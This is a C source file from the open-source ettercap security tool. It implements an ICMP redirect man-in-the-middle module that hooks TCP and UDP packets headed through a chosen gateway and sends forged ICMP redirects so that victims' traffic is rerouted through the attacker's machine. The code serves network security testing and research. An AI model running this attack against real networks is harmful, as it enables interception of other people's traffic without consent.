/*
    ettercap -- ICMP redirect mitm module

    Copyright (C) ALoR & NaGA

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: ec_icmp_redirect.c,v 1.6 2004/03/30 09:31:30 alor Exp $
*/

#include <ec.h>
#include <ec_mitm.h>
#include <ec_send.h>
#include <ec_sniff.h>
#include <ec_threads.h>
#include <ec_hook.h>
#include <ec_packet.h>

/* globals */

static struct target_env redirected_gw;

/* protos */

void icmp_redirect_init(void);
static int icmp_redirect_start(char *args);
static void icmp_redirect_stop(void);
static void icmp_redirect(struct packet_object *po);

/*******************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered mitm
 */

void __init icmp_redirect_init(void)
{
   struct mitm_method mm;

   mm.name = "icmp";
   mm.start = &icmp_redirect_start;
   mm.stop = &icmp_redirect_stop;
   
   mitm_add(&mm);
}


/*
 * init the ICMP REDIRECT attack
 */
static int icmp_redirect_start(char *args)
{
   struct ip_list *i;
   char tmp[MAX_ASCII_ADDR_LEN];
  
   DEBUG_MSG("icmp_redirect_start");

   /* check the parameter */
   if (!strcmp(args, "")) {
      SEMIFATAL_ERROR("ICMP redirect needs a parameter.\n");
   } else {
      char tmp[strlen(args)+2];

      /* add the / to be able to use the target parsing function */
      sprintf(tmp, "%s/", args);
      
      if (compile_target(tmp, &redirected_gw) != ESUCCESS)
         SEMIFATAL_ERROR("Wrong target parameter");
   }

   /* we need both mac and ip addresses */
   if (redirected_gw.all_mac || redirected_gw.all_ip)
      SEMIFATAL_ERROR("You must specify both MAC and IP addresses for the GW");

   i = LIST_FIRST(&redirected_gw.ips);
   USER_MSG("ICMP redirect: victim GW %s\n", ip_addr_ntoa(&i->ip, tmp));

   /* add the hook to receive all the tcp and udp packets */
   hook_add(HOOK_PACKET_TCP, &icmp_redirect);
   hook_add(HOOK_PACKET_UDP, &icmp_redirect);

   return ESUCCESS;
}


/*
 * shut down the redirect process
 */
static void icmp_redirect_stop(void)
{
   
   DEBUG_MSG("icmp_redirect_stop");
   
   USER_MSG("ICMP redirect stopped.\n");

   /* delete the hook points */
   hook_del(HOOK_PACKET_TCP, &icmp_redirect);
   hook_del(HOOK_PACKET_UDP, &icmp_redirect);
}

/*
 * the redirect function.
 *
 * redirect all the traffic that goes thru the gateway
 * check the dst mac address and the dst ip address.
 *
 * respect the TARGETs for the redirections
 */
static void icmp_redirect(struct packet_object *po)
{
   struct ip_list *i;
   char tmp[MAX_ASCII_ADDR_LEN];

   /* retrieve the gw ip */
   i = LIST_FIRST(&redirected_gw.ips);
   
   /* the packet must be directed to the gateway */
   if (memcmp(po->L2.dst, redirected_gw.mac, MEDIA_ADDR_LEN))
      return;

   /* 
    * if the packet endpoint is the gateway, skip it.
    * we are interested only in packet going THRU the 
    * gateway, not TO the gateway
    */
   if (!ip_addr_cmp(&po->L3.dst, &i->ip))
      return;
  
   /* redirect only the connection that match the TARGETS */ 
   EXECUTE(GBL_SNIFF->interesting, po);
   
   /* the packet is not interesting */
   if ( po->flags & PO_IGNORE )
      return;
   
   USER_MSG("ICMP redirected %s:%d -> ", ip_addr_ntoa(&po->L3.src, tmp), ntohs(po->L4.src));
   USER_MSG("%s:%d\n", ip_addr_ntoa(&po->L3.dst, tmp), ntohs(po->L4.dst));

   /* send the ICMP redirect */
   send_icmp_redir(ICMP_REDIRECT_HOST, &i->ip, &GBL_IFACE->ip, po);
   
}


/* EOF */

// vim:ts=3:expandtab

